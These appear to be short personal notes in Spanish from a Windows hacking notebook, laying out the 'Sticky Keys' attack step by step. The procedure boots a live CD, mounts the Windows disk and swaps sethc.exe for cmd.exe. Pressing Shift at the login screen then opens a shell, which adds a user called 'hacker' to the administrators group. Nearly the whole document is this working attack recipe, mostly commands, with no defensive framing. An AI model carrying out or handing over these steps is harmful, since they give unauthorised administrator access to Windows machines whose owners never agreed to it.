# Ataque con Sticky Keys

Area: Windows Hacking

%systemroot%\system32\sethc.exe

.bak → Copia de seguridad de un archivo

cmp / diff → Para comprobar que la copia es identica 

```bash
  Ejecutar livecd y montar el disco: mkdir windows → mount /dev/sda* windows/
Acceder a windows\System32 y mover el sethc.exe para reemplazarlo por cmd.exe:  
cd Windows\System32 → mv sethc.exe sethc.exe.bak → cp cmd.exe sethc.exe  → 
cmp cmd.exe sethc.exe
```

Reiniciar y presionar shift repetidas veces

```powershell
net user hacker passwd /add 
net localgroup administradores hacker /add
```

*Este proceso se puede realizar con un cd/usb de recuperacion de windows*